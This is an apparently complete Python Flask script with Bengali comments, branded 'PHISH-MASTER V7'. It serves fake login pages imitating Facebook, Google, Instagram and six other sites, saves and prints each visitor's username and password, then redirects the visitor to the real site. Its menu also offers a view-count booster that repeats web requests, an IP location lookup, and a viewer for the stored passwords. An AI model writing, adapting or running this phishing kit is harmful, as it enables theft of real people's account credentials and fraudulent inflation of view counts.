import os, sys, threading, requests, time
from flask import Flask, render_template_string, request, redirect

# কালার কোড
R, G, Y, C, W = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;36m', '\033[1;37m'

app = Flask(__name__)
current_site = "Facebook"

# --- ফেক পেজ ডিজাইন (একই ডিজাইনে লোগো বদলে যাবে) ---
html_template = """
<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>{{site}} Login</title></head>
<body style="font-family: Arial; background: #f0f2f5; text-align: center; padding-top: 50px;">
    <div style="background: white; max-width: 350px; margin: auto; padding: 25px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15);">
        <h1 style="color: #1877f2; font-size: 35px;">{{site}}</h1>
        <p style="color: #606770; font-size: 16px;">Log in to your account</p>
        <form action="/login" method="get">
            <input type="text" name="u" placeholder="Email or Phone" required style="width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
            <input type="password" name="p" placeholder="Password" required style="width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
            <button type="submit" style="width: 98%; background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer;">Log In</button>
        </form>
        <hr style="margin: 20px 0; border: 0.5px solid #ddd;">
        <p style="color: #1877f2; cursor: pointer;">Forgotten password?</p>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_template, site=current_site)

@app.route('/login')
def login():
    user = request.args.get('u')
    pw = request.args.get('p')
    # ডাটা সেভ করা
    with open("captured_passwords.txt", "a") as f:
        f.write(f"[{current_site}] User: {user} | Pass: {pw}\n")
    print(f"\n{R}[!] {current_site} ডাটা পাওয়া গেছে!{W}")
    print(f"{G}User: {Y}{user}{W} | {G}Pass: {Y}{pw}{W}")
    return redirect("https://www." + current_site.lower() + ".com")

# --- মেনু এবং বাকি সিস্টেম ---
def banner():
    os.system('clear')
    print(f"""{C}
    ╔═══════════════════════════════════════════╗
    ║  {Y}██████╗ ██╗   ██╗██████╗  █████╗ ███████╗{C}  ║
    ║  {Y}██╔══██╗██║   ██║██╔══██╗██╔══██╗██╔════╝{C}  ║
    ║  {Y}██████╔╝██║   ██║██████╔╝███████║█████╗  {C}  ║
    ║  {Y}██╔══██╗██║   ██║██╔══██╗██╔══██║██╔══╝  {C}  ║
    ║  {Y}██║  ██║╚██████╔╝██████╔╝██║  ██║███████╗{C}  ║
    ║  {Y}╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝{C}  ║
    ║       {G}PHISH-MASTER V7 - Rubaeat Edition{C}    ║
    ╚═══════════════════════════════════════════╝{W}""")

def start_phishing():
    global current_site
    sites = ["Facebook", "Instagram", "Google", "TikTok", "Netflix", "Spotify", "GitHub", "Twitter", "LinkedIn"]
    print(f"\n{Y}কোন সাইটের ফেক পেজ বানাতে চাও?{W}")
    for i, s in enumerate(sites): print(f"[{i+1}] {s}")
    
    choice = int(input(f"\n{G}সিলেক্ট কর: {W}"))
    current_site = sites[choice-1]
    
    print(f"\n{G}[+] {current_site} সার্ভার চালু হচ্ছে...{W}")
    print(f"{C}[*] নিজের ব্রাউজারে যাও: {Y}http://127.0.0.1:5000 {W}")
    print(f"{R}[!] ডাটা দেখার জন্য এই টার্মিনাল বন্ধ করবে না।{W}")
    
    # ফ্ল্যাক্স সার্ভার চালু করা
    threading.Thread(target=lambda: app.run(port=5000, debug=False, use_reloader=False)).start()

def main():
    while True:
        banner()
        print(f"{Y}[1]{W} Multi-Phishing (৯টি সাইটের ফেক পেজ)")
        print(f"{Y}[2]{W} Video View Booster (ভিউ বাড়ানো)")
        print(f"{Y}[3]{W} IP Tracker (লোকেশন ট্র্যাকিং)")
        print(f"{Y}[4]{W} Check Captured Data (চুরি করা পাসওয়ার্ড)")
        print(f"{Y}[0]{W} Exit")
        
        choice = input(f"\n{G}পছন্দ: {W}")
        
        if choice == '1':
            start_phishing()
            input(f"\n{Y}ফিরে যেতে এন্টার চাপো...{W}")
        elif choice == '2':
            url = input(f"{C}URL: {W}"); count = int(input(f"{C}Count: {W}"))
            for i in range(count): requests.get(url); print(f"{G}[+] ভিউ {i+1} পাঠানো হয়েছে।{W}")
            input("\nBack...")
        elif choice == '3':
            ip = input(f"{C}IP: {W}")
            r = requests.get(f"http://ip-api.com/json/{ip}").json()
            print(f"{G}দেশ: {W}{r['country']} | {G}শহর: {W}{r['city']}")
            input("\nBack...")
        elif choice == '4':
            if os.path.exists("captured_passwords.txt"):
                print(f"\n{G}--- সংরক্ষিত পাসওয়ার্ড ---{W}")
                print(open("captured_passwords.txt").read())
            else: print(f"{R}কোনো ডাটা নেই!{W}")
            input("\nBack...")
        elif choice == '0': sys.exit()

if __name__ == "__main__":
    main()